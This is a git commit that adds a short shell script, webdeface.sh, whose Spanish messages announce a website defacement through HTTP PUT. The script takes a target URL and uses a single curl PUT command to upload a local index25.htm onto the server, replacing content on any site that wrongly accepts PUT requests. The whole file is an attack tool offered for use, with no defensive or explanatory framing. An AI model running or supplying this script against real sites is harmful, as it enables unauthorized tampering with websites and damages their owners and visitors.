13b214b6322355e5737f877ba815de9321281023
hackingyseguridad <antonio_taboada@hotmail.es>
2025-04-20 18:39:24 +0200

    Create webdeface.sh

---
+++ webdeface.sh
@@ -0,0 +1,10 @@
+
+
+echo 
+echo " Web deface por metodo http PUT "
+echo " Se requiere index25.htm em la misma carpeta donde esta esta script "
+echo "Uso.: sh webdeface.sh URL "  
+echo 
+curl -v -X PUT $1/index25.htm -d @index25.htm
+
+
